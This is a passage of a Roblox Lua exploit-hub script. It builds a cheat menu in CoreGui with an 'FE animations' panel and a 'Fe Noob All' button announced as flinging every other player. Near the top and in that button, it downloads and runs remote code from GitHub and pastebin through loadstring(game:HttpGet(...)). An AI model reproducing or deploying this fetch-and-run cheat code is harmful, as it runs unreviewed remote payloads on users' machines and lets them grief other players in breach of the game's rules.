print("Creating Frames And GUI")

local NotifyModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/notif-lib/main/main.lua"))()
local MainGUI = Instance.new("ScreenGui")
local Open = Instance.new("Frame")
local Open_2 = Instance.new("TextButton")
local Main_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local FeNoobAll = Instance.new("TextButton")
local FeAnimR6 = Instance.new("TextButton")
local FeChatB = Instance.new("TextButton")
local FeTelekineses = Instance.new("TextButton")
local FB = Instance.new("TextButton")
local FeGamepass = Instance.new("TextButton")
local Close = Instance.new("TextButton")

print("Created")
print("Loading Frames,GUI")

MainGUI.Name = "MainGUI"
MainGUI.Parent = game.CoreGui


Open.Name = "Open"
Open.Parent = MainGUI
Open.AnchorPoint = Vector2.new(0, 1)
Open.Size = UDim2.new(0, 100, 0, 24)
Open.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open.Position = UDim2.new(0, 0, 1, 0)
Open.BorderSizePixel = 0
Open.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Open_2.Name = "Open"
Open_2.Parent = Open
Open_2.Size = UDim2.new(0, 96, 0, 23)
Open_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open_2.Position = UDim2.new(0.0199999996, 0, 0.0416666679, 0)
Open_2.BorderSizePixel = 0
Open_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Open_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Open_2.Text = "Open Hub"
Open_2.TextSize = 14
Open_2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Open_2.Visible = true
Open_2.MouseButton1Down:Connect(function()
	Main_2.Visible = true
	wait(1)
	Open.Visible = false
        NotifyModule:Notify("Opened!", 2)
end)

print("Open Frame Loaded")

Main_2.Name = "Main"
Main_2.Parent = MainGUI
Main_2.Size = UDim2.new(0, 456, 0, 222)
Main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main_2.Position = UDim2.new(0.315278888, 0, 0.32159999, 0)
Main_2.BorderSizePixel = 0
Main_2.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
Main_2.Visible = false

TextLabel.Name = "TextLabel"
TextLabel.Parent = Main_2
TextLabel.Size = UDim2.new(0, 456, 0, 13)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.BackgroundColor3 = Color3.fromRGB(141, 141, 141)
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Text = "More TouseefX's Hub [Testing]"
TextLabel.TextSize = 14
TextLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)

ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.Parent = Main_2
ScrollingFrame.Active = true
ScrollingFrame.Size = UDim2.new(0, 456, 0, 209)
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.Position = UDim2.new(0, 0, 0.0585585572, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(141, 141, 141)
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)

FeNoobAll.Name = "FeNoobAll"
FeNoobAll.Parent = ScrollingFrame
FeNoobAll.Size = UDim2.new(0, 137, 0, 23)
FeNoobAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeNoobAll.Position = UDim2.new(0.0504385978, 0, 0.0440616868, 0)
FeNoobAll.BorderSizePixel = 0
FeNoobAll.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeNoobAll.TextColor3 = Color3.fromRGB(0, 0, 0)
FeNoobAll.Text = "Fe Noob All"
FeNoobAll.TextSize = 14
FeNoobAll.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeNoobAll.MouseButton1Down:Connect(function()
	NotifyModule:Notify("Fe Noob All Loaded Fling Everyone Now:)", 5)
	loadstring(game:HttpGet(('https://pastebin.ai/raw/1priqwpcnv'),true))()
        wait(4)
        NotifyModule:Notify("Script By jxserr", 5)
end)

FeAnimR6.Name = "FeAnimR6"
FeAnimR6.Parent = ScrollingFrame
FeAnimR6.Size = UDim2.new(0, 137, 0, 23)
FeAnimR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeAnimR6.Position = UDim2.new(0.350877196, 0, 0.0448816456, 0)
FeAnimR6.BorderSizePixel = 0
FeAnimR6.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeAnimR6.TextColor3 = Color3.fromRGB(0, 0, 0)
FeAnimR6.Text = "Fe Animtion R6"
FeAnimR6.TextSize = 14
FeAnimR6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeAnimR6.MouseButton1Down:Connect(function()
        NotifyModule:Notify("This Script is Huge Gonna Cook In", 3)
	local Energize = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local GuiBottomFrame = Instance.new("Frame")
	local Credits = Instance.new("TextLabel")
	local GuiTopFrame = Instance.new("Frame")
	local CloseGUI = Instance.new("TextButton")
	local Title = Instance.new("TextLabel")
	local CheckR = Instance.new("TextLabel")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local GlitchLevitate = Instance.new("TextButton")
	local FullSwing = Instance.new("TextButton")
	local MoonDance = Instance.new("TextButton")
	local FullPunch = Instance.new("TextButton")
	local FloorFaint = Instance.new("TextButton")
	local Crouch = Instance.new("TextButton")
	local SpinDance = Instance.new("TextButton")
	local JumpingJacks = Instance.new("TextButton")
	local ArmDetach = Instance.new("TextButton")
	local MegaInsane = Instance.new("TextButton")
	local WeirdMove = Instance.new("TextButton")
	local DinoWalk = Instance.new("TextButton")
	local FloorCrawl = Instance.new("TextButton")
	local Spinner = Instance.new("TextButton")
	local Faint = Instance.new("TextButton")
	local Levitate = Instance.new("TextButton")
	local LoopHead = Instance.new("TextButton")
	local HeadThrow = Instance.new("TextButton")
	local CloneIllusion = Instance.new("TextButton")
	local Dab = Instance.new("TextButton")
	local BarrelRoll = Instance.new("TextButton")
	local Insane = Instance.new("TextButton")
	local SwordSlam = Instance.new("TextButton")
	local MovingDance = Instance.new("TextButton")
	local ArmTurbine = Instance.new("TextButton")
	local SuperPunch = Instance.new("TextButton")
	local Scared = Instance.new("TextButton")
	local LoopSlam = Instance.new("TextButton")
	local HeroJump = Instance.new("TextButton")
	local SpinDance2 = Instance.new("TextButton")
	local SwordSlice = Instance.new("TextButton")
	local FloatingHead = Instance.new("TextButton")
	local InsaneArms = Instance.new("TextButton")
	local SuperFaint = Instance.new("TextButton")
	local FloatSit = Instance.new("TextButton")
	local BowDown = Instance.new("TextButton")
	local ScrollingFrameR15 = Instance.new("ScrollingFrame")
	local FloatSlash = Instance.new("TextButton")
	local ArmsOut = Instance.new("TextButton")
	local DownSlash = Instance.new("TextButton")
	local R15Spinner = Instance.new("TextButton")
	local WeirdZombie = Instance.new("TextButton")
	local CrazySlash = Instance.new("TextButton")
	local Pull = Instance.new("TextButton")
	local Open = Instance.new("TextButton")
	local CircleArm = Instance.new("TextButton")
	local Bend = Instance.new("TextButton")
	local RotateSlash = Instance.new("TextButton")
	local FlingArms = Instance.new("TextButton")
	local SideFrame = Instance.new("Frame")
	local OpenGUI = Instance.new("TextButton")
	local SideFrameTitle = Instance.new("TextLabel")
	--Properties:
	Energize.Name = "Energize"
	Energize.Parent = game.CoreGui
	Energize.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	MainFrame.Name = "MainFrame"
	MainFrame.Active = true
	MainFrame.Draggable = true
	MainFrame.Parent = Energize
	MainFrame.BackgroundColor3 = Color3.new(0.0313726, 0.0313726, 0.0313726)
	MainFrame.BackgroundTransparency = 0.15000000596046
	MainFrame.Position = UDim2.new(0.502199888, 0, 0.552243114, 0)
	MainFrame.Size = UDim2.new(0, 426, 0, 258)

	GuiBottomFrame.Name = "Gui BottomFrame"
	GuiBottomFrame.Parent = MainFrame
	GuiBottomFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	GuiBottomFrame.BackgroundTransparency = 1
	GuiBottomFrame.Position = UDim2.new(0, 0, 0.901309371, 0)
	GuiBottomFrame.Size = UDim2.new(0, 426, 0, 25)

	Credits.Name = "Credits"
	Credits.Parent = GuiBottomFrame
	Credits.BackgroundColor3 = Color3.new(0, 0, 0)
	Credits.BackgroundTransparency = 1
	Credits.Size = UDim2.new(0, 426, 0, 25)
	Credits.Font = Enum.Font.SourceSansSemibold
	Credits.Text = "Subscribe to A2b scripts (the script is not mine)"
	Credits.TextColor3 = Color3.new(1, 1, 1)
	Credits.TextSize = 17

	GuiTopFrame.Name = "Gui TopFrame"
	GuiTopFrame.Parent = MainFrame
	GuiTopFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	GuiTopFrame.BackgroundTransparency = 1
	GuiTopFrame.Position = UDim2.new(0, 0, -0.00178042857, 0)
	GuiTopFrame.Size = UDim2.new(0, 426, 0, 25)

	CloseGUI.Name = "CloseGUI"
	CloseGUI.Parent = GuiTopFrame
	CloseGUI.BackgroundColor3 = Color3.new(0, 0, 0)
	CloseGUI.BackgroundTransparency = 0.15000000596046
	CloseGUI.BorderSizePixel = 0
	CloseGUI.Position = UDim2.new(0.967136145, 0, 0, 0)
	CloseGUI.Size = UDim2.new(0, 15, 0, 15)
	CloseGUI.Font = Enum.Font.SourceSansSemibold
	CloseGUI.Text = "X"
	CloseGUI.TextColor3 = Color3.new(1, 1, 1)
	CloseGUI.TextSize = 14

	Title.Name = "Title"
	Title.Parent = GuiTopFrame
	Title.BackgroundColor3 = Color3.new(1, 1, 1)
	Title.BackgroundTransparency = 1
	Title.Position = UDim2.new(0.653472185, 0, 0, 0)
	Title.Size = UDim2.new(0, 105, 0, 25)
	Title.Font = Enum.Font.SourceSansSemibold
	Title.Text = "FE animations"
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.TextSize = 17

	CheckR.Name = "CheckR"
	CheckR.Parent = GuiTopFrame
	CheckR.BackgroundColor3 = Color3.new(1, 1, 1)
	CheckR.BackgroundTransparency = 1
	CheckR.Position = UDim2.new(0.0234741792, 0, 0, 0)
	CheckR.Size = UDim2.new(0, 194, 0, 24)
	CheckR.Font = Enum.Font.SourceSansSemibold
	CheckR.Text = "Text"
	CheckR.TextColor3 = Color3.new(1, 1, 1)
	CheckR.TextSize = 17
	CheckR.TextXAlignment = Enum.TextXAlignment.Left

	ScrollingFrame.Parent = MainFrame
	ScrollingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
	ScrollingFrame.BackgroundTransparency = 0.60000002384186
	ScrollingFrame.Position = UDim2.new(0, 0, 0.0951187983, 0)
	ScrollingFrame.Size = UDim2.new(0, 426, 0, 207)
	ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1.29999995, 0)
	ScrollingFrame.ScrollBarThickness = 10

	GlitchLevitate.Name = "GlitchLevitate"
	GlitchLevitate.Parent = ScrollingFrame
	GlitchLevitate.BackgroundColor3 = Color3.new(0, 0, 0)
	GlitchLevitate.BackgroundTransparency = 0.30000001192093
	GlitchLevitate.Position = UDim2.new(0.0469483584, 0, 0.0273178034, 0)
	GlitchLevitate.Size = UDim2.new(0, 90, 0, 30)
	GlitchLevitate.Font = Enum.Font.SourceSansSemibold
	GlitchLevitate.Text = "Glitch Levitate"
	GlitchLevitate.TextColor3 = Color3.new(1, 1, 1)
	GlitchLevitate.TextSize = 15

	FullSwing.Name = "FullSwing"
	FullSwing.Parent = ScrollingFrame
	FullSwing.BackgroundColor3 = Color3.new(0, 0, 0)
	FullSwing.BackgroundTransparency = 0.30000001192093
	FullSwing.Position = UDim2.new(0.267605633, 0, 0.0273178034, 0)
	FullSwing.Size = UDim2.new(0, 90, 0, 30)
	FullSwing.Font = Enum.Font.SourceSansSemibold
	FullSwing.Text = "Full Swing"
	FullSwing.TextColor3 = Color3.new(1, 1, 1)
	FullSwing.TextSize = 15

	MoonDance.Name = "MoonDance"
	MoonDance.Parent = ScrollingFrame
	MoonDance.BackgroundColor3 = Color3.new(0, 0, 0)
	MoonDance.BackgroundTransparency = 0.30000001192093
	MoonDance.Position = UDim2.new(0.713614941, 0, 0.0273178034, 0)
	MoonDance.Size = UDim2.new(0, 90, 0, 30)
	MoonDance.Font = Enum.Font.SourceSansSemibold
	MoonDance.Text = "Moon Dance"
	MoonDance.TextColor3 = Color3.new(1, 1, 1)
	MoonDance.TextSize = 15

	FullPunch.Name = "FullPunch"
	FullPunch.Parent = ScrollingFrame
	FullPunch.BackgroundColor3 = Color3.new(0, 0, 0)
	FullPunch.BackgroundTransparency = 0.30000001192093
	FullPunch.Position = UDim2.new(0.492957741, 0, 0.0273178034, 0)
	FullPunch.Size = UDim2.new(0, 90, 0, 30)
	FullPunch.Font = Enum.Font.SourceSansSemibold
	FullPunch.Text = "Full Punch"
	FullPunch.TextColor3 = Color3.new(1, 1, 1)
	FullPunch.TextSize = 15

	FloorFaint.Name = "FloorFaint"
	FloorFaint.Parent = ScrollingFrame
	FloorFaint.BackgroundColor3 = Color3.new(0, 0, 0)
	FloorFaint.BackgroundTransparency = 0.30000001192093
	FloorFaint.Position = UDim2.new(0.0469483584, 0, 0.134652346, 0)
	FloorFaint.Size = UDim2.new(0, 90, 0, 30)
	FloorFaint.Font = Enum.Font.SourceSansSemibold
	FloorFaint.Text = "Floor Faint"
	FloorFaint.TextColor3 = Color3.new(1, 1, 1)
	FloorFaint.TextSize = 15

	Crouch.Name = "Crouch"
	Crouch.Parent = ScrollingFrame
	Crouch.BackgroundColor3 = Color3.new(0, 0, 0)
	Crouch.BackgroundTransparency = 0.30000001192093
	Crouch.Position = UDim2.new(0.267605633, 0, 0.134652346, 0)
	Crouch.Size = UDim2.new(0, 90, 0, 30)
	Crouch.Font = Enum.Font.SourceSansSemibold
	Crouch.Text = "Crouch"
	Crouch.TextColor3 = Color3.new(1, 1, 1)
	Crouch.TextSize = 15

	SpinDance.Name = "SpinDance"
	SpinDance.Parent = ScrollingFrame
	SpinDance.BackgroundColor3 = Color3.new(0, 0, 0)
	SpinDance.BackgroundTransparency = 0.30000001192093
	SpinDance.Position = UDim2.new(0.713614941, 0, 0.134652346, 0)
	SpinDance.Size = UDim2.new(0, 90, 0, 30)
	SpinDance.Font = Enum.Font.SourceSansSemibold
	SpinDance.Text = "Spin Dance"
	SpinDance.TextColor3 = Color3.new(1, 1, 1)
	SpinDance.TextSize = 15

	JumpingJacks.Name = "JumpingJacks"
	JumpingJacks.Parent = ScrollingFrame
	JumpingJacks.BackgroundColor3 = Color3.new(0, 0, 0)
	JumpingJacks.BackgroundTransparency = 0.30000001192093
	JumpingJacks.Position = UDim2.new(0.492957741, 0, 0.134652346, 0)
	JumpingJacks.Size = UDim2.new(0, 90, 0, 30)
	JumpingJacks.Font = Enum.Font.SourceSansSemibold
	JumpingJacks.Text = "Jumping Jacks"
	JumpingJacks.TextColor3 = Color3.new(1, 1, 1)
	JumpingJacks.TextSize = 15

	ArmDetach.Name = "ArmDetach"
	ArmDetach.Parent = ScrollingFrame
	ArmDetach.BackgroundColor3 = Color3.new(0, 0, 0)
	ArmDetach.BackgroundTransparency = 0.30000001192093
	ArmDetach.Position = UDim2.new(0.0469483584, 0, 0.241986871, 0)
	ArmDetach.Size = UDim2.new(0, 90, 0, 30)
	ArmDetach.Font = Enum.Font.SourceSansSemibold
	ArmDetach.Text = "Arm Detach"
	ArmDetach.TextColor3 = Color3.new(1, 1, 1)
	ArmDetach.TextSize = 15

	MegaInsane.Name = "MegaInsane"
	MegaInsane.Parent = ScrollingFrame
	MegaInsane.BackgroundColor3 = Color3.new(0, 0, 0)
	MegaInsane.BackgroundTransparency = 0.30000001192093
	MegaInsane.Position = UDim2.new(0.267605633, 0, 0.241986871, 0)
	MegaInsane.Size = UDim2.new(0, 90, 0, 30)
	MegaInsane.Font = Enum.Font.SourceSansSemibold
	MegaInsane.Text = "Mega Insane"
	MegaInsane.TextColor3 = Color3.new(1, 1, 1)
	MegaInsane.TextSize = 15

	WeirdMove.Name = "WeirdMove"
	WeirdMove.Parent = ScrollingFrame
	WeirdMove.BackgroundColor3 = Color3.new(0, 0, 0)
	WeirdMove.BackgroundTransparency = 0.30000001192093
	WeirdMove.Position = UDim2.new(0.713614941, 0, 0.241986871, 0)
	WeirdMove.Size = UDim2.new(0, 90, 0, 30)
	WeirdMove.Font = Enum.Font.SourceSansSemibold
	WeirdMove.Text = "Weird Move"
	WeirdMove.TextColor3 = Color3.new(1, 1, 1)
	WeirdMove.TextSize = 15

	DinoWalk.Name = "DinoWalk"
	DinoWalk.Parent = ScrollingFrame
	DinoWalk.BackgroundColor3 = Color3.new(0, 0, 0)
	DinoWalk.BackgroundTransparency = 0.30000001192093
	DinoWalk.Position = UDim2.new(0.492957741, 0, 0.241986871, 0)
	DinoWalk.Size = UDim2.new(0, 90, 0, 30)
	DinoWalk.Font = Enum.Font.SourceSansSemibold
	DinoWalk.Text = "Dino Walk"
	DinoWalk.TextColor3 = Color3.new(1, 1, 1)
	DinoWalk.TextSize = 15

	FloorCrawl.Name = "FloorCrawl"
	FloorCrawl.Parent = ScrollingFrame
	FloorCrawl.BackgroundColor3 = Color3.new(0, 0, 0)
	FloorCrawl.BackgroundTransparency = 0.30000001192093
	FloorCrawl.Position = UDim2.new(0.492957741, 0, 0.349321395, 0)
	FloorCrawl.Size = UDim2.new(0, 90, 0, 30)
	FloorCrawl.Font = Enum.Font.SourceSansSemibold
	FloorCrawl.Text = "Floor Crawl"
	FloorCrawl.TextColor3 = Color3.new(1, 1, 1)
	FloorCrawl.TextSize = 15

	Spinner.Name = "Spinner"
	Spinner.Parent = ScrollingFrame
	Spinner.BackgroundColor3 = Color3.new(0, 0, 0)
	Spinner.BackgroundTransparency = 0.30000001192093
	Spinner.Position = UDim2.new(0.267605633, 0, 0.349321395, 0)
	Spinner.Size = UDim2.new(0, 90, 0, 30)
	Spinner.Font = Enum.Font.SourceSansSemibold
	Spinner.Text = "Spinner"
	Spinner.TextColor3 = Color3.new(1, 1, 1)
	Spinner.TextSize = 15

	Faint.Name = "Faint"
	Faint.Parent = ScrollingFrame
	Faint.BackgroundColor3 = Color3.new(0, 0, 0)
	Faint.BackgroundTransparency = 0.30000001192093
	Faint.Position = UDim2.new(0.713614941, 0, 0.349321395, 0)
	Faint.Size = UDim2.new(0, 90, 0, 30)
	Faint.Font = Enum.Font.SourceSansSemibold
	Faint.Text = "Faint"
	Faint.TextColor3 = Color3.new(1, 1, 1)
	Faint.TextSize = 15

	Levitate.Name = "Levitate"
	Levitate.Parent = ScrollingFrame
	Levitate.BackgroundColor3 = Color3.new(0, 0, 0)
	Levitate.BackgroundTransparency = 0.30000001192093
	Levitate.Position = UDim2.new(0.0469483584, 0, 0.349321395, 0)
	Levitate.Size = UDim2.new(0, 90, 0, 30)
	Levitate.Font = Enum.Font.SourceSansSemibold
	Levitate.Text = "Levitate"
	Levitate.TextColor3 = Color3.new(1, 1, 1)
	Levitate.TextSize = 15

	LoopHead.Name = "LoopHead"
	LoopHead.Parent = ScrollingFrame
	LoopHead.BackgroundColor3 = Color3.new(0, 0, 0)
	LoopHead.BackgroundTransparency = 0.30000001192093
	LoopHead.Position = UDim2.new(0.0469483584, 0, 0.456655949, 0)
	LoopHead.Size = UDim2.new(0, 90, 0, 30)
	LoopHead.Font = Enum.Font.SourceSansSemibold
	LoopHead.Text = "Loop Head"
	LoopHead.TextColor3 = Color3.new(1, 1, 1)
	LoopHead.TextSize = 15

	HeadThrow.Name = "HeadThrow"
	HeadThrow.Parent = ScrollingFrame
	HeadThrow.BackgroundColor3 = Color3.new(0, 0, 0)
	HeadThrow.BackgroundTransparency = 0.30000001192093
	HeadThrow.Position = UDim2.new(0.267605633, 0, 0.456655949, 0)
	HeadThrow.Size = UDim2.new(0, 90, 0, 30)
	HeadThrow.Font = Enum.Font.SourceSansSemibold
	HeadThrow.Text = "Head Throw"
	HeadThrow.TextColor3 = Color3.new(1, 1, 1)
	HeadThrow.TextSize = 15

	CloneIllusion.Name = "CloneIllusion"
	CloneIllusion.Parent = ScrollingFrame
	CloneIllusion.BackgroundColor3 = Color3.new(0, 0, 0)
	CloneIllusion.BackgroundTransparency = 0.30000001192093
	CloneIllusion.Position = UDim2.new(0.713614941, 0, 0.456655949, 0)
	CloneIllusion.Size = UDim2.new(0, 90, 0, 30)
	CloneIllusion.Font = Enum.Font.SourceSansSemibold
	CloneIllusion.Text = "Clone Illusion"
	CloneIllusion.TextColor3 = Color3.new(1, 1, 1)
	CloneIllusion.TextSize = 15

	Dab.Name = "Dab"
	Dab.Parent = ScrollingFrame
	Dab.BackgroundColor3 = Color3.new(0, 0, 0)
	Dab.BackgroundTransparency = 0.30000001192093
	Dab.Position = UDim2.new(0.492957741, 0, 0.456655949, 0)
	Dab.Size = UDim2.new(0, 90, 0, 30)
	Dab.Font = Enum.Font.SourceSansSemibold
	Dab.Text = "Dab"
	Dab.TextColor3 = Color3.new(1, 1, 1)
	Dab.TextSize = 15

	BarrelRoll.Name = "BarrelRoll"
	BarrelRoll.Parent = ScrollingFrame
	BarrelRoll.BackgroundColor3 = Color3.new(0, 0, 0)
	BarrelRoll.BackgroundTransparency = 0.30000001192093
	BarrelRoll.Position = UDim2.new(0.492957741, 0, 0.563990533, 0)
	BarrelRoll.Size = UDim2.new(0, 90, 0, 30)
	BarrelRoll.Font = Enum.Font.SourceSansSemibold
	BarrelRoll.Text = "Barrel Roll"
	BarrelRoll.TextColor3 = Color3.new(1, 1, 1)
	BarrelRoll.TextSize = 15

	Insane.Name = "Insane"
	Insane.Parent = ScrollingFrame
	Insane.BackgroundColor3 = Color3.new(0, 0, 0)
	Insane.BackgroundTransparency = 0.30000001192093
	Insane.Position = UDim2.new(0.267605633, 0, 0.563990533, 0)
	Insane.Size = UDim2.new(0, 90, 0, 30)
	Insane.Font = Enum.Font.SourceSansSemibold
	Insane.Text = "Insane"
	Insane.TextColor3 = Color3.new(1, 1, 1)
	Insane.TextSize = 15

	SwordSlam.Name = "SwordSlam"
	SwordSlam.Parent = ScrollingFrame
	SwordSlam.BackgroundColor3 = Color3.new(0, 0, 0)
	SwordSlam.BackgroundTransparency = 0.30000001192093
	SwordSlam.Position = UDim2.new(0.713614941, 0, 0.563990533, 0)
	SwordSlam.Size = UDim2.new(0, 90, 0, 30)
	SwordSlam.Font = Enum.Font.SourceSansSemibold
	SwordSlam.Text = "Sword Slam"
	SwordSlam.TextColor3 = Color3.new(1, 1, 1)
	SwordSlam.TextSize = 15

	MovingDance.Name = "MovingDance"
	MovingDance.Parent = ScrollingFrame
	MovingDance.BackgroundColor3 = Color3.new(0, 0, 0)
	MovingDance.BackgroundTransparency = 0.30000001192093
	MovingDance.Position = UDim2.new(0.0469483584, 0, 0.563990533, 0)
	MovingDance.Size = UDim2.new(0, 90, 0, 30)
	MovingDance.Font = Enum.Font.SourceSansSemibold
	MovingDance.Text = "Moving Dance"
	MovingDance.TextColor3 = Color3.new(1, 1, 1)
	MovingDance.TextSize = 15

	ArmTurbine.Name = "ArmTurbine"
	ArmTurbine.Parent = ScrollingFrame
	ArmTurbine.BackgroundColor3 = Color3.new(0, 0, 0)
	ArmTurbine.BackgroundTransparency = 0.30000001192093
	ArmTurbine.Position = UDim2.new(0.267605633, 0, 0.671325028, 0)
	ArmTurbine.Size = UDim2.new(0, 90, 0, 30)
	ArmTurbine.Font = Enum.Font.SourceSansSemibold
	ArmTurbine.Text = "Arm Turbine"
	ArmTurbine.TextColor3 = Color3.new(1, 1, 1)
	ArmTurbine.TextSize = 15

	SuperPunch.Name = "SuperPunch"
	SuperPunch.Parent = ScrollingFrame
	SuperPunch.BackgroundColor3 = Color3.new(0, 0, 0)
	SuperPunch.BackgroundTransparency = 0.30000001192093
	SuperPunch.Position = UDim2.new(0.0469483584, 0, 0.671325028, 0)
	SuperPunch.Size = UDim2.new(0, 90, 0, 30)
	SuperPunch.Font = Enum.Font.SourceSansSemibold
	SuperPunch.Text = "Super Punch"
	SuperPunch.TextColor3 = Color3.new(1, 1, 1)
	SuperPunch.TextSize = 15

	Scared.Name = "Scared"
	Scared.Parent = ScrollingFrame
	Scared.BackgroundColor3 = Color3.new(0, 0, 0)
	Scared.BackgroundTransparency = 0.30000001192093
	Scared.Position = UDim2.new(0.267605633, 0, 0.778659523, 0)
	Scared.Size = UDim2.new(0, 90, 0, 30)
	Scared.Font = Enum.Font.SourceSansSemibold
	Scared.Text = "Scared"
	Scared.TextColor3 = Color3.new(1, 1, 1)
	Scared.TextSize = 15

	LoopSlam.Name = "LoopSlam"
	LoopSlam.Parent = ScrollingFrame
	LoopSlam.BackgroundColor3 = Color3.new(0, 0, 0)
	LoopSlam.BackgroundTransparency = 0.30000001192093
	LoopSlam.Position = UDim2.new(0.713614941, 0, 0.671325028, 0)
	LoopSlam.Size = UDim2.new(0, 90, 0, 30)
	LoopSlam.Font = Enum.Font.SourceSansSemibold
	LoopSlam.Text = "Loop Slam"
	LoopSlam.TextColor3 = Color3.new(1, 1, 1)
	LoopSlam.TextSize = 15

	HeroJump.Name = "HeroJump"
	HeroJump.Parent = ScrollingFrame
	HeroJump.BackgroundColor3 = Color3.new(0, 0, 0)
	HeroJump.BackgroundTransparency = 0.30000001192093
	HeroJump.Position = UDim2.new(0.0469483584, 0, 0.778659523, 0)
	HeroJump.Size = UDim2.new(0, 90, 0, 30)
	HeroJump.Font = Enum.Font.SourceSansSemibold
	HeroJump.Text = "Hero Jump"
	HeroJump.TextColor3 = Color3.new(1, 1, 1)
	HeroJump.TextSize = 15

	SpinDance2.Name = "SpinDance2"
	SpinDance2.Parent = ScrollingFrame
	SpinDance2.BackgroundColor3 = Color3.new(0, 0, 0)
	SpinDance2.BackgroundTransparency = 0.30000001192093
	SpinDance2.Position = UDim2.new(0.713614941, 0, 0.778659523, 0)
	SpinDance2.Size = UDim2.new(0, 90, 0, 30)
	SpinDance2.Font = Enum.Font.SourceSansSemibold
	SpinDance2.Text = "Spin Dance 2"
	SpinDance2.TextColor3 = Color3.new(1, 1, 1)
	SpinDance2.TextSize = 15

	SwordSlice.Name = "SwordSlice"
	SwordSlice.Parent = ScrollingFrame
	SwordSlice.BackgroundColor3 = Color3.new(0, 0, 0)
	SwordSlice.BackgroundTransparency = 0.30000001192093
	SwordSlice.Position = UDim2.new(0.492957741, 0, 0.671325028, 0)
	SwordSlice.Size = UDim2.new(0, 90, 0, 30)
	SwordSlice.Font = Enum.Font.SourceSansSemibold
	SwordSlice.Text = "Sword Slice"
	SwordSlice.TextColor3 = Color3.new(1, 1, 1)
	SwordSlice.TextSize = 15

	FloatingHead.Name = "FloatingHead"
	FloatingHead.Parent = ScrollingFrame
	FloatingHead.BackgroundColor3 = Color3.new(0, 0, 0)
	FloatingHead.BackgroundTransparency = 0.30000001192093
	FloatingHead.Position = UDim2.new(0.492957741, 0, 0.778659523, 0)
	FloatingHead.Size = UDim2.new(0, 90, 0, 30)
	FloatingHead.Font = Enum.Font.SourceSansSemibold
	FloatingHead.Text = "Floating Head"
	FloatingHead.TextColor3 = Color3.new(1, 1, 1)
	FloatingHead.TextSize = 15

	InsaneArms.Name = "InsaneArms"
	InsaneArms.Parent = ScrollingFrame
	InsaneArms.BackgroundColor3 = Color3.new(0, 0, 0)
	InsaneArms.BackgroundTransparency = 0.30000001192093
	InsaneArms.Position = UDim2.new(0.0469483584, 0, 0.888975561, 0)
	InsaneArms.Size = UDim2.new(0, 90, 0, 30)
	InsaneArms.Font = Enum.Font.SourceSansSemibold
	InsaneArms.Text = "Insane Arms"
	InsaneArms.TextColor3 = Color3.new(1, 1, 1)
	InsaneArms.TextSize = 15

	SuperFaint.Name = "SuperFaint"
	SuperFaint.Parent = ScrollingFrame
	SuperFaint.BackgroundColor3 = Color3.new(0, 0, 0)
	SuperFaint.BackgroundTransparency = 0.30000001192093
	SuperFaint.Position = UDim2.new(0.267605633, 0, 0.888975561, 0)
	SuperFaint.Size = UDim2.new(0, 90, 0, 30)
	SuperFaint.Font = Enum.Font.SourceSansSemibold
	SuperFaint.Text = "Super Faint"
	SuperFaint.TextColor3 = Color3.new(1, 1, 1)
	SuperFaint.TextSize = 15

	FloatSit.Name = "FloatSit"
	FloatSit.Parent = ScrollingFrame
	FloatSit.BackgroundColor3 = Color3.new(0, 0, 0)
	FloatSit.BackgroundTransparency = 0.30000001192093
	FloatSit.Position = UDim2.new(0.492957741, 0, 0.888975561, 0)
	FloatSit.Size = UDim2.new(0, 90, 0, 30)
	FloatSit.Font = Enum.Font.SourceSansSemibold
	FloatSit.Text = "FloatSit"
	FloatSit.TextColor3 = Color3.new(1, 1, 1)
	FloatSit.TextSize = 15

	BowDown.Name = "BowDown"
	BowDown.Parent = ScrollingFrame
	BowDown.BackgroundColor3 = Color3.new(0, 0, 0)
	BowDown.BackgroundTransparency = 0.30000001192093
	BowDown.Position = UDim2.new(0.713614941, 0, 0.888975561, 0)
	BowDown.Size = UDim2.new(0, 90, 0, 30)
	BowDown.Font = Enum.Font.SourceSansSemibold
	BowDown.Text = "Bow Down"
	BowDown.TextColor3 = Color3.new(1, 1, 1)
	BowDown.TextSize = 15

	ScrollingFrameR15.Name = "ScrollingFrameR15"
	ScrollingFrameR15.Parent = MainFrame
	ScrollingFrameR15.BackgroundColor3 = Color3.new(0, 0, 0)
	ScrollingFrameR15.BackgroundTransparency = 0.60000002384186
	ScrollingFrameR15.Position = UDim2.new(-0.00150352798, 0, 0.0951187983, 0)
